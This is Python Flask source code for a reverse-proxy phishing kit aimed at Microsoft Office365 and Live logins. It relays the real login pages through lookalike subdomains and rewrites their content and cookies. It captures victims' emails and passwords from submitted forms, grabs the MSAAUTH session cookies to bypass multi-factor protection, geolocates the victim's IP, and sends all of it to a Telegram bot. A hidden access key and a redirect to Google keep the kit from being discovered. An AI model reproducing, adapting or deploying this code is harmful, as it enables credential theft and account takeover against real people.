from flask import Flask, request, make_response, redirect, session
import httpx
import json
import re
import os
import random
import string
import logging

app = Flask(__name__)
app.secret_key = os.getenv('SECRET_KEY', 'supersecretkey')
app.config['SESSION_COOKIE_DOMAIN'] = f'.{os.getenv("DOMAIN", "localhost.com")}'  # Set cookie domain for all subdomains

bot_token = os.getenv('BOT_TOKEN', '')
chat_id = os.getenv('CHAT_ID', '')

DOMAIN = os.getenv('DOMAIN', 'localhost.com')
GO = os.getenv('HIDDEN', '123')
HPATH = os.getenv('HPATH', 'gn')
SUBDOMAINS = ['login', 'service', 'login-portal', 'account-service', 'ftp-service']

domain_map = {
    'login.microsoftonline.com': f'{SUBDOMAINS[0]}.{DOMAIN}',   # portal.localhost.com
    'login.live.com': f'{SUBDOMAINS[2]}.{DOMAIN}',              # login-service.localhost.com
    'account.live.com': f'{SUBDOMAINS[3]}.{DOMAIN}',            # account-service.localhost.com
    'fpt.live.com': f'{SUBDOMAINS[4]}.{DOMAIN}',                # ftp-service.localhost.com
    'microsoftonline.com': DOMAIN,                              # localhost.com
    'live.com': f'{SUBDOMAINS[1]}.{DOMAIN}',                    # service.localhost.com
}

domain_map_rev = {v: k for k, v in domain_map.items()}

logging.basicConfig(level=logging.INFO)

@app.route(f'/{HPATH}', methods=['GET'])
def login():
    if request.args.get('share') == GO:
        session['email'] = request.args.get('ggnd')
        session['tokken'] = ''.join(random.choices(string.ascii_letters + string.digits, k=10))
        return redirect(f'https://{domain_map["login.microsoftonline.com"]}/login?ggnd={session["email"]}')
    return redirect('https://google.com')

def check_token():
    if not session.get('tokken'):
        return redirect('https://google.com')
    return None

@app.route('/', defaults={'path': ''}, methods=['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS'])
@app.route('/<path:path>', methods=['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS'])
def handle(path):
    token_redirect = check_token()
    if token_redirect:
        return token_redirect

    if request.method == 'OPTIONS':
        return handle_options_request()

    return proxy(path)

@app.route('/login', defaults={'path': ''}, methods=['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS'])
def handle_redirect(path):
    token_redirect = check_token()
    if token_redirect:
        return token_redirect

    if request.method == 'OPTIONS':
        return handle_options_request()

    headers = {
        'Content-Type': 'application/x-www-form-urlencoded',
        'Cache-Control': 'no-cache',
        'Host': 'login.microsoftonline.com',
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-encoding': 'gzip, deflate, br, zstd',
        'accept-language': 'en-US,en;q=0.9',
        'sec-ch-ua': '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Linux"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'none',
        'sec-fetch-user': '?1'
    }

    url = f'https://login.microsoftonline.com/common/oauth2/v2.0/authorize?client_id=4765445b-32c6-49b0-83e6-1d93765276ca&redirect_uri=https://www.office.com/landingv2&response_type=code id_token&scope=openid profile https://www.office.com/v2/OfficeHome.All&response_mode=form_post&nonce=638745078208305137.YzQ5YjJjZDctZTMzOC00NTg2LWIwMTEtNmI0M2QxZWY3YWJjYzJmOGQ1OWEtNzZlMy00OTdjLTliOGYtN2Y4ODJhMDcxMzEz&ui_locales=en-US&mkt=en-US&client-request-id=7387f4ad-b91d-4402-9571-c708544cea0b&state=_gv7OSsPJQrHD2ul_vmlSlHrtRgmXrhtuKfeaOheceCx2Q6fU2t6b1TvGXEwWSjQ95oAfGyaSv0qHSpjDi1SDgYpuPrhttzvcGZLc6Hto0uNarasDsuSgRjyojkWkYnrf90pOJAkjenrHqXZp8VSUL3Ws0JrPB8bnukCDgVq_HhavmjYVEB4tnSqOg5zTXNAqb9xbNgrEmV69N386Q7Pvq0qOOox13d-cnXIvdJRyAHESzOPyxsM7tkxuJp5FTSucZXbwoJGEOVNN7GmS-IFPA&x-client-SKU=ID_NET8_0&x-client-ver=7.5.1.0'

    try:
        with httpx.Client() as client:
            resp = client.get(url, headers=headers, cookies=request.cookies)
            resp.raise_for_status()

            flowTk = re.search(r'"sFT":\s*"([^"]+)"', resp.text).group(1)
            orq = re.search(r'"sCtx":\s*"([^"]+)"', resp.text).group(1)
            logging.info(f"sFT value extracted: {flowTk}")
            logging.info(f"sCtx value extracted: {orq}")

    except httpx.RequestError as e:
        logging.error(f"Request error: {e}")
        return str(e), 500

    response = create_response(resp)
    modify_cookies_in_response(resp, response)
    modify_content_in_response(resp, response)

    return response

def proxy(path):
    token_redirect = check_token()
    if token_redirect:
        return token_redirect

    host = request.headers.get('Host', '')
    target = determine_target(host)

    if request.method == 'OPTIONS':
        return handle_options_request()

    url = construct_url(target, path)
    headers = construct_headers(target)

    try:
        resp = httpx.request(
            method=request.method,
            url=url,
            headers=headers,
            content=request.get_data(),
            cookies=request.cookies,
            follow_redirects=False,
            verify=False
        )
    except httpx.RequestError as e:
        logging.error(f"Request error: {e}")
        return str(e), 500

    if "/ppsecure/post.srf?username=" in url:
        USERNAME, PASSWORD = extract_credentials()

    response = create_response(resp)

    if should_send_cookies_to_bot(resp):
        save_and_send_cookies(USERNAME, PASSWORD, resp)
        return make_response(redirect("https://login.microsoftonline.com"))

    modify_cookies_in_response(resp, response)
    modify_content_in_response(resp, response)

    return response

def determine_target(host):
    return domain_map_rev.get(host, 'microsoftonline.com')

def handle_options_request():
    origin = request.headers.get('Origin', '')
    cors_origin = origin if re.match(rf'^https?://(.*\.)?{re.escape(DOMAIN)}$', origin) else ''
    response = make_response('', 204)
    response.headers['Access-Control-Allow-Origin'] = cors_origin
    response.headers['Access-Control-Allow-Methods'] = 'GET, POST, OPTIONS, PUT, DELETE'
    response.headers['Access-Control-Allow-Headers'] = 'Authorization, Content-Type, client-request-id, correlationid, hpgact, hpgid'
    response.headers['Access-Control-Max-Age'] = '1728000'
    return response

def construct_url(target, path):
    url = f'https://{target}/{path}'
    if request.query_string:
        url += f'?{request.query_string.decode()}'
    return url

def construct_headers(target):
    headers = {
        'Host': target,
        'Accept-Encoding': 'identity',
        'X-Real-IP': request.remote_addr,
        'X-Forwarded-For': request.headers.get('X-Forwarded-For', ''),
        'X-Forwarded-Proto': request.scheme
    }
    for key, value in request.headers.items():
        if key.lower() not in ['host', 'accept-encoding']:
            headers[key] = value
    return headers

def extract_credentials():
    try:
        USERNAME = request.form["loginfmt"]
        PASSWORD = request.form["passwd"]
        logging.info(f"Extracted password: {PASSWORD}")
        return USERNAME, PASSWORD
    except Exception as e:
        logging.error(f"Error extracting password: {e}")
        return "", ""

def create_response(resp):
    content = resp.content
    status_code = resp.status_code

    response = make_response(content, status_code)
    for header in ['Access-Control-Allow-Origin', 'Content-Security-Policy', 'X-Frame-Options']:
        response.headers.pop(header, None)
    origin = request.headers.get('Origin', '')
    cors_origin = origin if re.match(rf'^https?://(.*\.)?{re.escape(DOMAIN)}$', origin) else ''
    response.headers['Access-Control-Allow-Origin'] = cors_origin
    response.headers['Access-Control-Allow-Methods'] = 'GET, POST, OPTIONS, PUT, DELETE'
    response.headers['Access-Control-Allow-Headers'] = 'Authorization, Content-Type, client-request-id, correlationid, hpgact, hpgid'
    response.headers['Access-Control-Expose-Headers'] = 'Content-Length, Content-Range'
    response.headers['Access-Control-Allow-Credentials'] = 'true'
    return response

def should_send_cookies_to_bot(resp):
    set_cookies = resp.headers.get_list('Set-Cookie')
    return any("__Host-MSAAUTH" in cookie for cookie in set_cookies)

def save_and_send_cookies(USERNAME, PASSWORD, resp):
    set_cookies = resp.headers.get_list('Set-Cookie')
    COOKIES = {
        "Cookies ==>>": [clean_cookie(cookie) for cookie in set_cookies],
    }
    with open('cookies.txt', 'a') as f:
        f.write(json.dumps(COOKIES, indent=4))
        
    with open('cookie.txt', 'w') as f:
        f.write(json.dumps(COOKIES, indent=4))
    send_tg(USERNAME, PASSWORD)
    send_bot('cookie.txt')

def clean_cookie(cookie):
    cookie_data = ext_cookie(cookie)
    formatted_cookie = {
        "domain": ".live.com",
        "hostOnly": True,
        "httpOnly": "HttpOnly" in cookie,
        "name": next(iter(cookie_data.keys()), ""),
        "path": cookie_data.get("Path", "/"),
        "sameSite": "no_restriction",
        "secure": "Secure" in cookie,
        "session": True,
        "storeId": "0",
        "value": cookie_data.get(next(iter(cookie_data.keys()), ""), "")
    }
    return formatted_cookie

def ext_cookie(cookie):
    matches = re.findall(r'([^;=]+)=([^;]*)', cookie)
    return {name.strip(): value.strip() for name, value in matches}

def modify_cookies_in_response(resp, response):
    set_cookies = resp.headers.get_list('Set-Cookie')
    for cookie in set_cookies:
        new_cookie = re.sub(r'Domain=([^;]+)', f'Domain={DOMAIN}', cookie, flags=re.IGNORECASE)
        new_cookie = new_cookie.replace('microsoftonline.com', domain_map['microsoftonline.com'])
        new_cookie = new_cookie.replace('live.com', domain_map['live.com'])
        response.headers.add('Set-Cookie', new_cookie)

def modify_content_in_response(resp, response):
    content_type = resp.headers.get('Content-Type', '').lower()
    content = resp.text

    if any(t in content_type for t in ['text', 'javascript', 'json', 'html']):
        for key, value in domain_map.items():
            content = content.replace(key, value)
        response.set_data(content)
        if 'Content-Length' in response.headers:
            response.headers['Content-Length'] = str(len(response.get_data()))
    return response

def send_bot(file_path):
    url = f'https://api.telegram.org/bot{bot_token}/sendDocument'
    try:
        if not os.path.exists(file_path):
            raise FileNotFoundError(f"File not found: {file_path}")

        with open(file_path, 'rb') as file:
            files = {'document': file}
            data = {'chat_id': chat_id}

            response = httpx.post(url, data=data, files=files)
            response.raise_for_status()

            logging.info("File sent successfully to Telegram.")
    except httpx.HTTPStatusError as e:
        logging.error(f"HTTP error occurred while sending the file: {e}")
    except httpx.RequestError as e:
        logging.error(f"Request error occurred while sending the file: {e}")
    except Exception as e:
        logging.error(f"An unexpected error occurred: {e}")
        
def send_tg(user, pwd):
    url = f'https://api.telegram.org/bot{bot_token}/sendMessage'
    ip = request.remote_addr
    ip_details = httpx.get(f'http://ip-api.com/json/{ip}').json()
    message = f'''
⚜️ ==== New Office365 login ==== ⚜️ 
👤 Email:   {user}
🔑 Password:   {pwd}
📍 IP:   {request.remote_addr}
🌍 Country:   {ip_details.get('country', 'N/A')}
🏙️ Region:   {ip_details.get('regionName', 'N/A')}
🏡 City:   {ip_details.get('city', 'N/A')}
📡 ISP:   {ip_details.get('isp', 'N/A')}

📝 Created by @bytebend3r 
    '''
    data = {
        'chat_id': chat_id,
        'text': message
    }

    try:
        response = httpx.post(url, data=data)
        response.raise_for_status()
        logging.info("Credentials sent successfully to Telegram.")
    except httpx.HTTPStatusError as e:
        logging.error(f"HTTP error occurred while sending the credentials: {e}")
    except httpx.RequestError as e:
        logging.error(f"Request error occurred while sending the credentials: {e}")
    except Exception as e:
        logging.error(f"An unexpected error occurred: {e}")

if __name__ == '__main__':
    cert_file = os.getenv('CERT_FILE', 'localhost.com+5.pem')
    key_file = os.getenv('CERT_KEY', 'localhost.com+5-key.pem')
    print(f"Running at https://{SUBDOMAINS[0]}.{DOMAIN}/{HPATH}?share={GO}")
    app.run(host='0.0.0.0', port=443, ssl_context=(cert_file, key_file), debug=True)
